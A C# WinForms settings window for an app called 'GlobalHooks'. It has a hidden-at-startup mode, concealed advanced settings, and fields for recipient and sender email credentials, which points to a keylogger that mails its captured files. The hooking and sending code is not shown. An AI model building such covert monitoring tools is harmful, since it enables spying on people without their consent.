using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace GlobalHooks
{
    public partial class MainWindow : Form
    {
        private readonly ConfigurationInfo _configuration;
        private readonly GlobalHooksController _hooksController;
        private readonly ConfigurationFileController _configurationFileController = new ConfigurationFileController();
        private readonly Regex _regex = new Regex("[.\\-_a-z0-9]+@([a-z0-9][\\-a-z0-9]+\\.)+[a-z]{2,6}");

        public MainWindow()
        {
            InitializeComponent();
            _configuration = _configurationFileController.ReadFromFile();
            _hooksController = new GlobalHooksController(_configuration);
            _hooksController.ShowWindow += MainWindowShow;
            _hooksController.ShowAdvancedSettings += ShowAdvancedSettings;
        }

        private void btSettings_Click(object sender, EventArgs e)
        {
            InitializeGroupBoxSettings();
            gbSettings.Visible = true;
        }

        private void InitializeGroupBoxSettings()
        {
            cbHide.Checked = _configuration.HiddenMode;
            tbEmail.Text = _configuration.To;
            numUDFileSize.Value = _configuration.FileSize > 0 ? _configuration.FileSize : 1;
        }

        private void btHide_Click(object sender, EventArgs e)
        {
            Hide();
        }

        private void btSave_Click(object sender, EventArgs e)
        {
            if (!IsValidEmail(tbEmail.Text))
            {
                MessageBox.Show(@"Неверный формат email");
                return;
            }
            UpdateAndSaveConfiguration();
            gbSettings.Visible = false;
        }

        private bool IsValidEmail(string email)
        {
            return _regex.IsMatch(email.ToLower());
        }

        private void UpdateAndSaveConfiguration()
        {
            _configuration.HiddenMode = cbHide.Checked;
            _configuration.To = tbEmail.Text;
            _configuration.FileSize = (long)numUDFileSize.Value;
            _configurationFileController.SaveToFile(_configuration);
        }

        private void btAbort_Click(object sender, EventArgs e)
        {
            gbSettings.Visible = false;
        }

        private void InitializeGroupBoxAdvansedSettings()
        {
            tbFrom.Text = _configuration.From;
            tbPassword.Text = _configuration.Password;
        }

        private void btSaveAdvansedSettings_Click(object sender, EventArgs e)
        {
            if (!IsValidEmail(tbFrom.Text))
            {
                MessageBox.Show(@"Неверный формат email");
                return;
            }
            UpdateAndSaveAdvansedSettings();
            gbAdvansedSettings.Visible = false;
        }

        private void UpdateAndSaveAdvansedSettings()
        {
            _configuration.From = tbFrom.Text;
            _configuration.Password = tbPassword.Text;
            _configurationFileController.SaveToFile(_configuration);
        }

        private void btAbortAdvansedSettings_Click(object sender, EventArgs e)
        {
            gbAdvansedSettings.Visible = false;
        }

        private void MainWindow_Shown(object sender, EventArgs e)
        {
            if (_configuration.HiddenMode)
            {
                Hide();
            }
        }

        private void MainWindowShow()
        {
            Show();
        }

        private void ShowAdvancedSettings()
        {
            InitializeGroupBoxAdvansedSettings();
            gbAdvansedSettings.Visible = true;
            Show();
        }

        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            _hooksController.CloseThreads();
        }
    }
}
